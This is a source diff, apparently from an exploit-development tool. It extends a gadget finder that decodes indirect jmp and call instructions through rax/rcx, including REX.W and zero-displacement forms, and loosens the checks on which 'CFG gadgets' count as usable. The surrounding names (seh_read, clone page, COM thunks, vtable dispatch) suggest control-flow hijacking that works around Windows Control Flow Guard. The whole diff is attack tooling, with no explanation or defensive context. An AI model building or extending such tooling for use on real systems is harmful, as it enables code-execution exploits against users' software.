@@ -28,11 +28,11 @@ bool seh_read(uintptr_t addr, void* out, size_t n) {
 
 
 bool gadget_usable(const CfgGadget& g) {
-    if (!g.va || g.disp <= 0 || (g.disp & 7))
+    if (!g.va || g.disp < 0)
         return false;
-    // Any 8-aligned disp that fits on the clone page. Old 0x100+ window
-    // produced hits=0 — COM thunks are jmp [rax+8]/+0x10/+0x18.
-    if (g.disp >= 8 && g.disp <= 0x3F8)
+    if (g.disp != 0 && (g.disp & 7))
+        return false;
+    if (g.disp >= 0 && g.disp <= 0x3F8)
         return true;
     return false;
 }
@@ -67,14 +67,29 @@ CfgGadget decode_jmp(uintptr_t va, const uint8_t* b, size_t n) {
         g.va = 0;
         return g;
     }
+    // jmp [rax+disp] / jmp [rcx+disp]
     if (b[0] == 0xFF && b[1] == 0x60) { g.via_rax = true;  g.disp = (int8_t)b[2]; return g; }
     if (n >= 6 && b[0] == 0xFF && b[1] == 0xA0) { g.via_rax = true;  g.disp = *(int32_t*)(b + 2); return g; }
+    if (b[0] == 0xFF && b[1] == 0x20) { g.via_rax = true;  g.disp = 0; return g; }
     if (b[0] == 0xFF && b[1] == 0x61) { g.via_rax = false; g.disp = (int8_t)b[2]; return g; }
     if (n >= 6 && b[0] == 0xFF && b[1] == 0xA1) { g.via_rax = false; g.disp = *(int32_t*)(b + 2); return g; }
+    if (b[0] == 0xFF && b[1] == 0x21) { g.via_rax = false; g.disp = 0; return g; }
+    // call [rax+disp] / call [rcx+disp] — same vtable dispatch, just CALL instead of JMP
+    if (b[0] == 0xFF && b[1] == 0x50) { g.via_rax = true;  g.disp = (int8_t)b[2]; return g; }
+    if (n >= 6 && b[0] == 0xFF && b[1] == 0x90) { g.via_rax = true;  g.disp = *(int32_t*)(b + 2); return g; }
+    if (b[0] == 0xFF && b[1] == 0x10) { g.via_rax = true;  g.disp = 0; return g; }
+    if (b[0] == 0xFF && b[1] == 0x51) { g.via_rax = false; g.disp = (int8_t)b[2]; return g; }
+    if (n >= 6 && b[0] == 0xFF && b[1] == 0x91) { g.via_rax = false; g.disp = *(int32_t*)(b + 2); return g; }
+    if (b[0] == 0xFF && b[1] == 0x11) { g.via_rax = false; g.disp = 0; return g; }
+    // REX.W prefixed jmp/call
     if (n >= 4 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x60) { g.via_rax = true;  g.disp = (int8_t)b[3]; return g; }
     if (n >= 7 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0xA0) { g.via_rax = true;  g.disp = *(int32_t*)(b + 3); return g; }
     if (n >= 4 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x61) { g.via_rax = false; g.disp = (int8_t)b[3]; return g; }
     if (n >= 7 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0xA1) { g.via_rax = false; g.disp = *(int32_t*)(b + 3); return g; }
+    if (n >= 4 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x50) { g.via_rax = true;  g.disp = (int8_t)b[3]; return g; }
+    if (n >= 7 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x90) { g.via_rax = true;  g.disp = *(int32_t*)(b + 3); return g; }
+    if (n >= 4 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x51) { g.via_rax = false; g.disp = (int8_t)b[3]; return g; }
+    if (n >= 7 && b[0] == 0x48 && b[1] == 0xFF && b[2] == 0x91) { g.via_rax = false; g.disp = *(int32_t*)(b + 3); return g; }
     if (n >= 6 && b[0] == 0x48 && b[1] == 0x8B && b[2] == 0x40 && b[4] == 0xFF && b[5] == 0xE0) {
         g.via_rax = true; g.disp = (int8_t)b[3]; return g;
     }
@@ -116,11 +131,22 @@ size_t skip_one(const uint8_t* p, size_t left) {
 
 int find_ind_jmp(const uint8_t* b, size_t n) {
     for (size_t i = 0; i + 2 < n; ) {
-        if (b[i] == 0xE8 || b[i] == 0xE9) { i += 5; continue; } // rel32 — FF 60 in disp is not a gadget
+        if (b[i] == 0xE8 || b[i] == 0xE9) { i += 5; continue; }
         if (b[i] == 0xFF) {
-            if (b[i + 1] == 0x60 || b[i + 1] == 0x61 || b[i + 1] == 0x20)
+            // jmp [rax/rcx+disp] and call [rax/rcx+disp]
+            if (b[i + 1] == 0x60 || b[i + 1] == 0x61 || b[i + 1] == 0x20 || b[i + 1] == 0x21 ||
+                b[i + 1] == 0x50 || b[i + 1] == 0x51 || b[i + 1] == 0x10 || b[i + 1] == 0x11)
                 return (int)i;
-            if (i + 5 < n && (b[i + 1] == 0xA0 || b[i + 1] == 0xA1))
+            if (i + 5 < n && (b[i + 1] == 0xA0 || b[i + 1] == 0xA1 ||
+                              b[i + 1] == 0x90 || b[i + 1] == 0x91))
+                return (int)i;
+        }
+        if (b[i] == 0x48 && i + 3 < n && b[i + 1] == 0xFF) {
+            uint8_t m = b[i + 2];
+            if (m == 0x60 || m == 0x61 || m == 0x20 || m == 0x21 ||
+                m == 0x50 || m == 0x51 || m == 0x10 || m == 0x11)
+                return (int)i;
+            if (i + 6 < n && (m == 0xA0 || m == 0xA1 || m == 0x90 || m == 0x91))
                 return (int)i;
         }
         ++i;
